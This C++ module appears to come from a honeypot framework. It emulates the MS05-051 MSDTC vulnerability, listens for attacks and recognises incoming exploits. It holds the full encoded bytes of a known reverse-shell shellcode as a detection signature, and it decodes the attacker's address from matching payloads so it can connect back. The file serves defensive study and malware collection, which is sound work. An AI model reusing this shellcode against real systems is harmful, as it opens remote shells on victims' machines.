/*
 * Simulates MS05-51 (Remote Code Execution in MSDTC).
 *
 * $Id: vuln-ms0551-module.cpp 260 2005-12-16 01:21:09Z oxff $
 *
 * If Jovanka's not the one... ;>
 *
 */
 

#include "vuln-ms0551.h"

#include <netinet/in.h>

extern "C"
{
	// wrappers around constructor and deconstructor to have nice dll interface
	
	void * CreateInstance()
	{
		return new VulnerabilityModule();
	}

	void FreeInstance(void * pInstance)
	{
		delete (VulnerabilityModule *) pInstance;
	}
}


VulnerabilityModule::VulnerabilityModule()
{
}

VulnerabilityModule::~VulnerabilityModule()
{
}


bool VulnerabilityModule::start()
{
	m_pCollector->getShellcodeDispatcher()->registerParser(this);
		
	return m_pCollector->getNetworkCore()->registerSubscriber(m_pConfiguration->getLong("listen-port", 1025), this);
}

void VulnerabilityModule::stop()
{
	m_pCollector->getShellcodeDispatcher()->unregisterParser(this);
	m_pCollector->getNetworkCore()->unregisterSubscriber(m_pConfiguration->getLong("listen-port", 1025), this);
}


NetworkSubscription * VulnerabilityModule::createNetworkSubscription(Socket * pSocket)
{	
	return new VulnerabilitySubscription(m_pCollector, pSocket);
}

void VulnerabilityModule::freeNetworkSubscription(NetworkSubscription * pSubscription)
{
	delete (VulnerabilitySubscription *) pSubscription;
}


unsigned char SWAN_reverse_shellcode[] =
"\xEB\x0F\x5B\x33\xC9\x66\xb9\xaa\x04\x80\x33\x99\x43\xE2\xFA\xEB"
"\x05\xE8\xEC\xFF\xFF\xFF"
"\x70\x6D\x99\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85"
"\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A"
"\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A"
"\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC"
"\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58"
"\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
"\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71"
"\xE9\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3"
"\x9B\xC0\x71\xC4\x99\x99\x99\x1A\x75\xDD\x12\x6D\xF3\x89\xC0\x10"
"\x9D\x17\x7B\x62\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66\xCE\x61\x12"
"\x41\x10\xC7\xA1\x10\xC7\xA5\x10\xC7\xD9\xFF\x5E\xDF\xB5\x98\x98"
"\x14\xDE\x89\xC9\xCF\xAA\x59\xC9\xC9\xC9\xF3\x98\xC9\xC9\x14\xCE"
"\xA5\x5E\x9B\xFA\xF4\xFD\x99\xCB\xC9\x66\xCE\x75\x5E\x9E\x9B\x99"
"\x9E\x24\x5E\xDE\x9D\xE6\x99\x99\x98\xF3\x89\xCE\xCA\x66\xCE\x65"
"\xC9\x66\xCE\x69\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66"
"\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\x9E\x66\x66\x66\xDE\xFC"
"\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC"
"\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED"
"\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB"
"\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA"
"\xF6\xFA\xF2\xFC\xED\xD8\x99\xFA\xF6\xF7\xF7\xFC\xFA\xED\x99";;

bool VulnerabilityModule::parseShellcode(const unsigned char * pucShellcode, unsigned int nLength, unsigned long ulHost, CorrelationId cid)
{
	if(nLength < sizeof(SWAN_reverse_shellcode) - 1)
		return false;
		
	for(int i = 0; i < sizeof(SWAN_reverse_shellcode) - 1; ++i)
		if(pucShellcode[i] != (unsigned char) SWAN_reverse_shellcode[i] && (i < 213+22 || i > 213+22 + 4) && (i < 208+22 || i > 208+22 + 2))
			return false;
			
	LOG(LT_SHELLCODE | LT_LEVEL_LOW, "Got a MS05-51 Swan reverse shellcode for 0x%08x:%hu.", (* (unsigned long *) (pucShellcode + 213+22)) ^ 0x99999999, ntohs(* ((unsigned short *) (pucShellcode + 208+22))) ^ 0x9999);
	m_pCollector->getShellManager()->reverseShell((* (unsigned long *) (pucShellcode + 213+22)) ^ 0x99999999, ntohs(* ((unsigned short *) (pucShellcode + 208+22))) ^ 0x9999, cid);
	
	return true;
}
